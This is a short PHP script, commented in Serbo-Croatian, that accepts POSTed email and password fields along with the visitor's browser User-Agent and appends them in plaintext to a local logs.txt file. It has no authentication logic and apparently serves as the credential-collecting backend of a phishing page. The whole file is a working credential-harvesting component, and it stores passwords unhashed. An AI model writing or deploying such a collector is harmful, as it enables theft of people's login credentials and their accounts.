<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'] ?? 'N/A';
    $password = $_POST['password'] ?? 'N/A';
    $userAgent = $_SERVER['HTTP_USER_AGENT'];

    $log = "Email: $email, Password: $password, User-Agent: $userAgent\n";

    // Sačuvaj u fajl
    file_put_contents('logs.txt', $log, FILE_APPEND);

    echo "Data saved!";
    exit;
}
?>
